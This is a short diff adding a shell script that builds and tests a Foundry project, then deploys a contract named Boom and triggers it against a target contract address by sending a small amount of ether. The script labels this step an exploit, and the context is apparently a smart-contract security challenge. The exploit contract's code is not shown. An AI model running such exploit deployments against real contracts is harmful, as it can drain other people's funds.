@@ -1,0 +1,15 @@
+#!/bin/sh
+
+echo building and testing contract
+forge build
+forge test
+
+echo deploying exploit contract
+EXPLOIT_CONTRACT=$(forge create --private-key $PRIVATE_KEY --json src/Boom.sol:Boom | jq '.deployedTo' --raw-output | cat)
+echo $EXPLOIT_CONTRACT
+
+echo triggering exploit
+echo *NOTE::: CONTRACT_ADDRESS variable must be left padded to 32 bytes
+cast send --private-key $PRIVATE_KEY --value 0.0009ether $EXPLOIT_CONTRACT $CONTRACT_ADDRESS
+
+echo 'done'
